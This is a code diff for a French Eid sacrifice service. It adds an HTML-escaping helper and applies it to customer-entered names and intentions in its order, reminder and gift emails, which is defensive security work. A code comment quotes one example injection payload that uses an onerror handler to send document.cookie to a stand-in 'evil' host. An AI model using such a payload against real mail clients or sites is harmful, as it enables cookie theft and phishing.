@@ -40,6 +40,26 @@ const SUPPORT_EMAIL = "support@qurbaniya.fr";
 const WHATSAPP_NUMBER = "+33 7 44 79 88 83";
 const WHATSAPP_LINK = "https://wa.me/33744798883";
 
+/**
+ * Échappe les caractères HTML dans un input client avant de l'injecter
+ * dans les templates emails (HTML brut). Sans cette protection, un client
+ * malicieux pourrait commander avec une niyyah contenant du HTML/JS
+ * (ex: `<img src=x onerror=fetch("//evil/"+document.cookie)>`) qui serait
+ * rendu dans la boîte du destinataire — vecteur phishing direct.
+ *
+ * Couvre `niyyah`, `prenom`, `nom`, `recipient_name`, `recipient_message`,
+ * et toute autre saisie libre client.
+ */
+function esc(value: string | null | undefined): string {
+  if (value === null || value === undefined) return "";
+  return String(value)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
 /* ── Base template wrapper — fond crème, hero accueillant ── */
 function emailLayout(content: string, recipientEmail?: string): string {
   const unsubLink = recipientEmail ? unsubscribeUrl(recipientEmail) : null;
@@ -186,7 +206,7 @@ export async function sendOrderConfirmation(order: Order) {
     </table>
 
     <h1 style="color:#1A1A18;font-size:26px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
-      Barakallah fikoum, ${order.prenom} !
+      Barakallah fikoum, ${esc(order.prenom)} !
     </h1>
 
     <p style="margin:0 0 32px;color:#5C5347;font-size:16px;text-align:center;line-height:1.6;">
@@ -244,7 +264,7 @@ export async function sendOrderConfirmation(order: Order) {
                 </tr>
                 <tr>
                   <td style="color:#5C5347;font-size:14px;padding:6px 0;">Niyyah</td>
-                  <td style="color:#B8860B;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;font-family:Georgia,serif;font-style:italic;">${order.niyyah}</td>
+                  <td style="color:#B8860B;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</td>
                 </tr>
               `;
             }
@@ -257,7 +277,7 @@ export async function sendOrderConfirmation(order: Order) {
                     } sacrifice</td>
                     <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;">
                       <span style="color:#5C5347;">${intentionFr(s.intention)} · </span>
-                      <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;font-weight:bold;">${s.niyyah}</span>
+                      <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;font-weight:bold;">${esc(s.niyyah)}</span>
                     </td>
                   </tr>
                 `
@@ -266,7 +286,7 @@ export async function sendOrderConfirmation(order: Order) {
           })()}
           ${order.is_gift && order.recipient_name ? `<tr>
             <td style="color:#5C5347;font-size:14px;padding:6px 0;">Offert à</td>
-            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">🎁 ${order.recipient_name}</td>
+            <td style="color:#1A1A18;font-size:14px;padding:6px 0;text-align:right;font-weight:bold;">🎁 ${esc(order.recipient_name)}</td>
           </tr>` : ""}
         </table>
       </td></tr>
@@ -358,17 +378,17 @@ export async function sendOrderConfirmation(order: Order) {
       const personalMessage = order.recipient_message?.trim() || "";
       const giftHtml = emailLayout(`
         <h1 style="color:#1A1A18;font-size:24px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
-          Un cadeau pour vous, ${recipName}
+          Un cadeau pour vous, ${esc(recipName)}
         </h1>
         <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
-          <strong>${order.prenom} ${order.nom}</strong> vous a offert un sacrifice
+          <strong>${esc(order.prenom)} ${esc(order.nom)}</strong> vous a offert un sacrifice
           de l'Aïd al-Adha 2026 via Qurbaniya — qu'Allah récompense cette générosité.
         </p>
         ${personalMessage ? `
         <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#FDF6E3;border-left:4px solid #D4A843;border-radius:0 8px 8px 0;margin:0 0 24px;">
           <tr><td style="padding:16px 20px;">
             <p style="margin:0 0 6px;color:#8B6508;font-size:11px;letter-spacing:1.5px;text-transform:uppercase;font-weight:bold;">Mot personnel</p>
-            <p style="margin:0;color:#5C5347;font-size:14px;line-height:1.6;font-style:italic;font-family:Georgia,serif;">« ${personalMessage} »</p>
+            <p style="margin:0;color:#5C5347;font-size:14px;line-height:1.6;font-style:italic;font-family:Georgia,serif;">« ${esc(personalMessage)} »</p>
           </td></tr>
         </table>` : ""}
         <p style="margin:0 0 18px;color:#5C5347;font-size:14px;line-height:1.7;">
@@ -377,7 +397,7 @@ export async function sendOrderConfirmation(order: Order) {
           email dans les 48 heures suivantes.
         </p>
         <p style="margin:0;color:#5C5347;font-size:13px;text-align:center;line-height:1.6;font-style:italic;font-family:Georgia,serif;">
-          Qu'Allah accepte ce sacrifice de ${order.prenom}.
+          Qu'Allah accepte ce sacrifice de ${esc(order.prenom)}.
         </p>
       `, order.recipient_email);
 
@@ -385,7 +405,7 @@ export async function sendOrderConfirmation(order: Order) {
         from: FROM,
         to: order.recipient_email,
         headers: unsubscribeHeaders(order.recipient_email),
-        subject: `🎁 ${order.prenom} vous offre un sacrifice Aïd 2026`,
+        subject: `🎁 ${esc(order.prenom)} vous offre un sacrifice Aïd 2026`,
         html: giftHtml,
       });
       console.log("Email gift recipient sent:", giftResult.data?.id ?? "ok");
@@ -406,7 +426,7 @@ export async function sendPaymentReminder(order: Order) {
 
   const html = emailLayout(`
     <h1 style="color:#1A1A18;font-size:24px;margin:0 0 12px;font-weight:bold;font-family:Georgia,serif;">
-      Finalisez votre commande, ${order.prenom}
+      Finalisez votre commande, ${esc(order.prenom)}
     </h1>
 
     <p style="margin:0 0 28px;color:#5C5347;font-size:15px;line-height:1.7;">
@@ -482,7 +502,7 @@ export async function sendSacrificeDay(order: Order) {
     </div>
 
     <h1 style="color:#1A1A18;font-size:28px;margin:0 0 8px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
-      Aïd Moubarak, ${order.prenom} !
+      Aïd Moubarak, ${esc(order.prenom)} !
     </h1>
 
     <p style="text-align:center;margin:0 0 28px;color:#B8860B;font-size:15px;font-style:italic;font-family:Georgia,serif;">
@@ -490,7 +510,7 @@ export async function sendSacrificeDay(order: Order) {
     </p>
 
     <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
-      Votre sacrifice au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${order.niyyah}</strong> est actuellement effectué par notre cheikh, dans le respect total de la Sunnah.
+      Votre sacrifice au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</strong> est actuellement effectué par notre cheikh, dans le respect total de la Sunnah.
     </p>
 
     <!-- Encart vidéo à venir -->
@@ -575,14 +595,14 @@ export async function sendAbandonedCartReminder(order: Order, resumeUrl: string)
               ? "pour votre famille"
               : "en sadaqa";
           return `Votre commande pour un sacrifice ${introIntention} au nom de
-            <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${order.niyyah}</strong>
+            <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</strong>
             est en attente de paiement.`;
         })()
       : `Votre commande pour <strong>${qty} sacrifices</strong> est en attente de paiement.`;
 
   const html = emailLayout(`
     <h1 style="color:#1A1A18;font-size:25px;margin:0 0 12px;font-weight:bold;font-family:Georgia,serif;">
-      Vous y étiez presque, ${order.prenom}
+      Vous y étiez presque, ${esc(order.prenom)}
     </h1>
 
     <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;">
@@ -615,7 +635,7 @@ export async function sendAbandonedCartReminder(order: Order, resumeUrl: string)
           ${sacrificesList.length === 1
             ? `<tr>
                 <td style="color:#5C5347;font-size:14px;padding:5px 0;">Niyyah</td>
-                <td style="color:#B8860B;font-size:14px;padding:5px 0;text-align:right;font-weight:bold;font-family:Georgia,serif;font-style:italic;">${order.niyyah}</td>
+                <td style="color:#B8860B;font-size:14px;padding:5px 0;text-align:right;font-weight:bold;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</td>
               </tr>`
             : sacrificesList
                 .map(
@@ -626,7 +646,7 @@ export async function sendAbandonedCartReminder(order: Order, resumeUrl: string)
                       } sacrifice</td>
                       <td style="color:#1A1A18;font-size:14px;padding:5px 0;text-align:right;">
                         <span style="color:#5C5347;">${intentionFr(s.intention)} · </span>
-                        <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;font-weight:bold;">${s.niyyah}</span>
+                        <span style="color:#B8860B;font-family:Georgia,serif;font-style:italic;font-weight:bold;">${esc(s.niyyah)}</span>
                       </td>
                     </tr>
                   `
@@ -662,7 +682,7 @@ export async function sendAbandonedCartReminder(order: Order, resumeUrl: string)
     from: FROM,
     to: order.email,
     headers: unsubscribeHeaders(order.email),
-    subject: `${order.prenom}, votre sacrifice Aïd 2026 vous attend`,
+    subject: `${esc(order.prenom)}, votre sacrifice Aïd 2026 vous attend`,
     html,
   });
 
@@ -700,8 +720,8 @@ export async function sendVideoDelivery(
     : `Votre sacrifice au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${firstNiyyah}</strong> a été accompli dans le respect total de la Sunnah. Voici la preuve vidéo nominative que nous vous avions promise.`;
 
   const title = isMulti
-    ? `Vos vidéos sont prêtes, ${order.prenom}`
-    : `Votre vidéo est prête, ${order.prenom}`;
+    ? `Vos vidéos sont prêtes, ${esc(order.prenom)}`
+    : `Votre vidéo est prête, ${esc(order.prenom)}`;
 
   const html = emailLayout(`
     <div style="text-align:center;margin:0 0 20px;">
@@ -772,7 +792,7 @@ export async function sendReviewRequest(order: Order) {
     </div>
 
     <h1 style="color:#1A1A18;font-size:24px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
-      Comment s'est passée votre expérience, ${order.prenom} ?
+      Comment s'est passée votre expérience, ${esc(order.prenom)} ?
     </h1>
 
     <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
@@ -835,7 +855,7 @@ export async function sendReferralLaunchEmail(order: Order) {
     </div>
 
     <h1 style="color:#1A1A18;font-size:26px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
-      Programme parrainage lancé, ${order.prenom} !
+      Programme parrainage lancé, ${esc(order.prenom)} !
     </h1>
 
     <p style="margin:0 0 28px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
@@ -902,7 +922,7 @@ export async function sendReferralLaunchEmail(order: Order) {
     from: FROM,
     to: order.email,
     headers: unsubscribeHeaders(order.email),
-    subject: `🎁 ${order.prenom}, votre code parrain Qurbaniya : ${code}`,
+    subject: `🎁 ${esc(order.prenom)}, votre code parrain Qurbaniya : ${code}`,
     html,
     replyTo: SUPPORT_EMAIL,
   });
@@ -938,22 +958,22 @@ export async function sendAidReminder(order: Order) {
 
   const introSentence =
     qty === 1
-      ? `Votre sacrifice <strong>${intentionLabel}</strong> au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${order.niyyah}</strong> est confirmé — référence <strong>${orderRef(order)}</strong>.`
+      ? `Votre sacrifice <strong>${intentionLabel}</strong> au nom de <strong style="color:#1A1A18;font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</strong> est confirmé — référence <strong>${orderRef(order)}</strong>.`
       : `Vos <strong>${qty} sacrifices</strong> sont confirmés — référence <strong>${orderRef(order)}</strong>.`;
 
   const niyyahsBlock =
     qty === 1
-      ? `<strong>Niyyah&nbsp;:</strong> <span style="font-family:Georgia,serif;font-style:italic;">${order.niyyah}</span><br>`
+      ? `<strong>Niyyah&nbsp;:</strong> <span style="font-family:Georgia,serif;font-style:italic;">${esc(order.niyyah)}</span><br>`
       : sacrificesList
           .map(
             (s, i) =>
-              `<strong>${i === 0 ? "1er" : `${i + 1}e`} sacrifice&nbsp;:</strong> <span style="color:#5C5347;">${intentionFr(s.intention)}</span> · <span style="font-family:Georgia,serif;font-style:italic;color:#B8860B;font-weight:bold;">${s.niyyah}</span><br>`
+              `<strong>${i === 0 ? "1er" : `${i + 1}e`} sacrifice&nbsp;:</strong> <span style="color:#5C5347;">${intentionFr(s.intention)}</span> · <span style="font-family:Georgia,serif;font-style:italic;color:#B8860B;font-weight:bold;">${esc(s.niyyah)}</span><br>`
           )
           .join("");
 
   const giftLine =
     order.is_gift && order.recipient_name
-      ? `<strong>Offert à&nbsp;:</strong> 🎁 ${order.recipient_name}<br>`
+      ? `<strong>Offert à&nbsp;:</strong> 🎁 ${esc(order.recipient_name)}<br>`
       : "";
 
   const html = emailLayout(`
@@ -962,7 +982,7 @@ export async function sendAidReminder(order: Order) {
     </div>
 
     <h1 style="color:#1A1A18;font-size:26px;margin:0 0 12px;font-weight:bold;text-align:center;font-family:Georgia,serif;">
-      ${order.prenom}, ${qty > 1 ? "vos sacrifices approchent" : "votre sacrifice approche"}
+      ${esc(order.prenom)}, ${qty > 1 ? "vos sacrifices approchent" : "votre sacrifice approche"}
     </h1>
 
     <p style="margin:0 0 24px;color:#5C5347;font-size:15px;line-height:1.7;text-align:center;">
@@ -1024,8 +1044,8 @@ export async function sendAidReminder(order: Order) {
     to: order.email,
     headers: unsubscribeHeaders(order.email),
     subject: qty > 1
-      ? `🐑 ${order.prenom}, vos ${qty} sacrifices du 27 mai approchent`
-      : `🐑 ${order.prenom}, votre sacrifice du 27 mai approche`,
+      ? `🐑 ${esc(order.prenom)}, vos ${qty} sacrifices du 27 mai approchent`
+      : `🐑 ${esc(order.prenom)}, votre sacrifice du 27 mai approche`,
     html,
     replyTo: SUPPORT_EMAIL,
   });
